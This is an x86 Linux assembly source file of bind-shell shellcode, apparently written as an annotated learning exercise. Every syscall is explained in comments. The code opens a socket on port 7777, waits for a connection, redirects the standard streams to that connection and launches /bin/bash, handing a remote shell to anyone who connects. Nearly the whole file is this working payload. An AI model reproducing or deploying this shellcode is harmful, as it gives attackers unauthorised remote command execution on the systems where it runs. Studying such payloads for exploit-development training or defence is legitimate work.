; Filename: bind.nasm
; Author:  Ron Chan
; Website:  http://ngailong.com

global _start			

section .text
_start:
    ; Overall plan here is
    ; 1. use socketcall make a socket file descriptor
    ; 2. use socketcall to call bind function
    ; 3. use socketcall to call listen function
    ; 4. use socketcall to call accept function
    ; 5. use socketcall? to call dup function to copy from stdin, stdout, stderr to the socket
    ; 6. execute /bin////bash upon connecting


    ; High level explanation

    ; Step 1, call socketcall, the syscall number is 66
    ; socketcall(int call, *unsigned long args)
    ; alert(!) This socketcall will be used through out this shellcode, every socket related ops is going to be under this socket call

    ; first we need to call socket to create a socketfd first
    ; the call number for socket is 1
    ; i.e.
    ; socketcall(1, pointer to args for socket)
    ; 
    ; socketfd = socket(int domain, int type, int protocol)
    ; AF_INET is 2, SOCK_STREAM is 1, protocol is 0
    ; socketfd = socket(2, 1, 0)
    ; eax = socketfd 

    ; Low level implementation
    ; Final state before the socketcall int0x80
    ; eax = 0x66
    ; ebx= 0x00000001
    ; 2, 1, 0
    ; ^
    ; ecx 

    xor ebx,ebx ; zero out ebx
    mul ebx ; zero out eax also
    push ebx ; push 0 to the stack
    inc ebx ; ebx is 1 now
    push ebx ; push 1 to the stack
    inc ebx ; ebx is 2 now
    push ebx ; stack is 2 ,1, 0 now
    dec ebx; ebx should be 1 to call socket
    mov ecx, esp ; as required by socketcall, the second arguments, which is ecx, need to point to the argument of the call
    mov al,0x66 ; prepare syscall of socketcall
    int 0x80 ; called, and the socketfd is returned in eax, eax = socket(2,1,0), socketfd = (AF_INET, SOCK_STREAM, protocol)


    ; High Level implementation
    ; Step 2, call the bind, bind is 2, so ebx is 2 in final state
    ; int bind(int sockfd, const struct sockaddr *addr[sin_family, sin_port, sin_addr] , socklen_t addrlen)
    ; bind(socketfd, pointer to the structure, length of structure)
    ; socketcall(2, pointer to bind's arguments)
    
    ; Low level implementation
    ; Final State before the socketcall 0x80
    ; ebx is 2 
    ; socketfd, pointer to the structure, length of structure
    ; ^
    ; ecx

    ; structure here is bind(socketfd, *[2,24862,0],16), you may notice, we only used 8 byte here, why would we specify the length of structure to be 16 here, it is because by definition, the structure should always be 16 bytes


    ; prepare the structure

    xor esi,esi         ; zero out esi
    inc ebx             ; ebx is 2 now
    push esi            ; push sin_addr 0 to stack
    push word 0x611e    ; network bypte 24862 is port 7777, mind the word used here, rmb is word, not byte nor dword
    push word bx        ; ebx is 2, push 2 to stack, because sin_family is 2 AF_INET, mind the word used here, rmb is word, not byte nor dword
    mov edx, esp        ; edx is now the pointer of the structure_addr

    ; So now we have a beautiful structure, which look like this
    ; [2,24862,0] -> which is exactly 16 byte


    ; prepare the list of args of ecx

    push byte 0x10      ; push the addrlen to stack , not sure what will happen if push word 0x10 or push dword 0x10

    push edx            ;  now edx (addr of the structure) is pushed on stack also

    push eax            ; the socketfd is still inside eax, so we are pushing the socketfd to the first of args
    xchg esi,eax        ; store socketfd to esi
    mov ecx,esp         ; second args, ecx, is now pointing the the beginning of the list of args

    mov al,0x66
    int 0x80



    ; now we call the listen function
    ; listen(int sockfd, int backlog)
    ; listen is number 4
    ; listen(socketfd, 0)

    xor edi, edi ; use edi as zero byte
    add ebx,0x2 ; ebx is 4 now
    push edi ; push 0 on the stack, as backlog
    push esi ; esi is storing socketfd
    mov ecx, esp

    ; Alert!! because eax is overwritten everytime, which mean we have to make eax to be 0x66 every time
    mov eax,edi
    mov al,0x66
    int 0x80





    ; now we call the accept function
    ; accept is number 5
    ; accept is int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
    ; accept(socketfd, 0,0)

    inc ebx ; ebx is now 5
    push edi ; push 0
    push edi ; push 0
    push esi ; push socketfd
    mov ecx,esp ; ecx is now pointing the the args

    mov eax,edi
    mov al,0x66
    int 0x80





    ; now we duplication all of the stdin, stdout, stderr to the client filedescriptor
    ; int dup2(int oldfd, int newfd)
    ; in this case, because the file descriptor is returned from accept function, which is stored in eax
    ; clientfd = accept(sockfd,sockadd,socklen(
    ; so we are going to do dup2(clientfd,0)
    ; dup2(clientfd,1)
    ; dup2(clientfd,2)
    ; dup2 is number 63 = dup2()

    xchg eax,ebx ; store the clientfd to ebx, and ebx is 5 right?
    mov ecx,eax ; make ecx is 5 also, we will copy filedescriptor from 5,4,3,2,1,0 to clientfd

loop:
    mov al,0x3f ; prepare eax for the syscall dup2
    int 0x80;
    dec ecx ; dec ecx one for each loop
    jns loop; look until newfd is 0



    ; finally we prepare the shellcode for /bin/sh
    ; execve syscall is 0x0b
    ; //bin/sh

    ; PUSH ////bin/bash (12) 
    
    push edi ; push 0, in order to end the string

    push 0x68736162
    push 0x2f6e6962
    push 0x2f2f2f2f

    mov ebx,esp ;  first args/ebx is pointing the the filename
    push edi ; zero byte, prepare for envp
    mov edx,esp ; pointer to 00000000 is stored in edx
    push ebx ; pointer to the filename is now on the list
    mov ecx, esp ; pointint to the beginning of the args

    mov al,0x0b; execve syscall
    int 0x80;
